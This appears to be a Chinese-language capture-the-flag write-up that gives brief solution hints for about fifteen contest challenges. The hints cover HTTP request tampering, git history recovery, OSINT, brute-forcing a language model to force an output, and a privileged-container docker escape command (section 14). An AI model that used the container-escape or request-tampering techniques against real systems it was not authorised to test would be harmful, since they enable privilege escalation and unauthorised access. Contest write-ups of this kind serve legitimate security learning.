## 1. 更深更暗
直接按住滚轮快速往下翻页 获得flag



## 2. 赛博井字棋
用fiddle抓包 改json为三连的对面下着的位置 获得flag


## 3. 猫咪小测
1. 直接搜中科大西区图书分布12层为英文书
2. 直接去搜文章 读总结知道23次方
3. 直接搜知道CONFIG_TCP_CONG_BBR
4. google 搜 mypy加halting problem
## 4.虫
使用rxsstv播放获得图


## 5. http集邮册
1. 200直接获得   
2. 404用/1 
3. 405GET改成PUT 
4. 400随便改改 
5. 505改成http2.0
http0.9无状态码 GET /index.html \r\n

## 6. git git
1. 题目说是撤销的提交使用git reflog 查看对head的修改
2. 然后通过git show + sha码一个一个找

## 7. 语言大模型
本地部署直接暴力

## 8. 图片压缩
直接用压缩网站压获得第一个flag

## 9. 奶奶的flag
Googlepixel的截图bug
## 10. 旅行
首先是诺贝尔奖 找到是东京大学 找到最年轻的 找到实验室
在东京大学附近找到上野公园
然后根据暑假在推特上搜索上野公园喷泉广场 找到在八月10日有啤酒节活动 有类似的大棚
在那个啤酒节的官推下找到志愿者的表格
入场价查看博物馆的官网500不是 1000不是 盲猜帮忙付钱了 0

## 11.  JSon
{"sss": NaN}

{"a":1,"a":1}

## 12.高频率星球
 asciinema 提取出output.txt     **asciinema cat x.cast > terminal_ output.txt**
 然后vim 批量删
 node跑一下就行了

## 13. 惜字如金
通过flag{}判断字典里缺啥缺的位置先用其他符号补起来 然后慢慢推理 猜试 跑一下 就出来了

## 14. docker
容器逃逸 特权容器提权
docker run -it --privileged -v /dev/shm:/dev/shm alpine
cat /dev/shm/flag

## 15.组委会模拟器
```javascript
async function recall(id) {
  await fetch("http://202.38.93.111:10021/api/deleteMessage", {
      "credentials": "include",
      "headers": {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
          "Accept": "application/json, text/plain, */*",
          "Accept-Language": "zh-CN,zh;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6",
          "Content-Type": "application/json"
      },
      "referrer": "http://202.38.93.111:10021/",
      "body": `{"id":${id}}`,
      "method": "POST",
      "mode": "cors"
  });
}

async function what() {

  const re = /.*hack\[.*\]/g;
  const container = document.querySelector(".fakeqq-container")
  let counter = 0;

  async function spy() {
    if (counter >= container.children.length) {
      return;
    }
    const text  = container.children[counter].textContent;
    if (text.match(re)) {
      await recall(counter);
      console.log(`recalled ${counter}`);
    }
    counter++;
  }
  setInterval(spy, 100);
}
what();
```
## 15. 签到
改get请求